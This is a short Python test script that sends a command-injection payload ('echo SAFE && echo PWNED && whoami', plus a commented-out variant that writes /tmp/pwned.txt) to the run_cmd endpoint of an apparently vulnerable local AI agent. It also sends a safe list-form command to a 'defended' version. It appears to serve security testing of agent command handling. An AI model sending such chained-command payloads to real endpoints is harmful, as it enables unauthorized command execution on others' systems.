import argparse, requests

BASE_VULN = "http://127.0.0.1:7001"
BASE_DEF  = "http://127.0.0.1:7002"


# --- CLI arguments ---
parser = argparse.ArgumentParser()
parser.add_argument("--url", help="Target chat endpoint URL (overrides defaults)")
parser.add_argument("--defended", action="store_true", help="Target defended agent instead of vulnerable")
args = parser.parse_args()

# --- Defaults ---
if args.url:
    target_url = f"{args.url}/run_cmd"
elif args.defended:
    target_url = f"{BASE_DEF}/run_cmd"
else:
    target_url = f"{BASE_VULN}/run_cmd"


if not args.defended:
    #payload = {"cmd": "echo SAFE && echo PWNED > /tmp/pwned.txt"}
    payload = {"cmd": "echo SAFE && echo PWNED && whoami"}
else:
    payload = {"cmd": ["echo", "SAFE"]}

r = requests.post(target_url, json=payload, timeout=5)
print("Status:", r.status_code, "Body:", r.text)
